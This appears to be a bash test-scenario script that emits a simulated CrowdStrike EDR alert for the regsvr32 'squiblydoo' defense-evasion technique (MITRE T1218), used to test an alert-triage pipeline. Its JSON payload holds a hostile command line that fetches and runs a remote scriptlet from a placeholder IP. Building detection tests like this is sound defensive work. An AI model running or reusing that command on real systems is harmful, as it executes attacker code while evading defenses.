#!/usr/bin/env bash
# =============================================================================
# Scenario: Suspicious - regsvr32 scriptlet (squiblydoo)
# =============================================================================
# MITRE ATT&CK: T1218
# Tactic:     Defense Evasion
# Severity:   MEDIUM (vendor-reported; Vyrox re-triages independently)
#
# regsvr32 fetching a remote scriptlet - the classic squiblydoo bypass, but low-confidence on its own.
#
# Expected Vyrox verdict: MEDIUM (ambiguous -> LLM tier).
# =============================================================================

SCENARIO_NAME="medium_regsvr32"
SCENARIO_SOURCE="crowdstrike"
SCENARIO_SEVERITY="MEDIUM"
SCENARIO_TACTIC="Defense Evasion"
SCENARIO_TECHNIQUE="T1218"

# Unique per fire (timestamp + random): the pipeline dedupes on
# (tenant, source, raw_id), so a per-second id would collapse rapid back-to-back
# fires of the same scenario into one alert. The random suffix keeps each fire a
# distinct detection, the way a real EDR assigns a fresh detect_id each time.
TIMESTAMP=$(date +%s)
DETECT_ID="cs-${TIMESTAMP}-${RANDOM}${RANDOM}"

# build_payload - emit the CrowdStrike-format detection JSON for this scenario.
# Args: $1 tenant_id (default "default-tenant").
build_payload() {
    local tenant_id="${1:-default-tenant}"
    cat <<EOF
{
    "detect_id": "${DETECT_ID}",
    "customer_id": "${tenant_id}",
    "timestamp": ${TIMESTAMP},
    "sensor": {
        "hostname": "win-workstation-14"
    },
    "process": {
        "user_name": "CORP\\\\tgomez",
        "file_name": "regsvr32.exe",
        "command_line": "regsvr32 /s /n /u /i:http://198.51.100.20/s.sct scrobj.dll",
        "sha256": "8888888888888888888888888888888888888888888888888888888888888888"
    },
    "tactic": "${SCENARIO_TACTIC}",
    "technique": "${SCENARIO_TECHNIQUE}",
    "severity": "${SCENARIO_SEVERITY}"
}
EOF
}
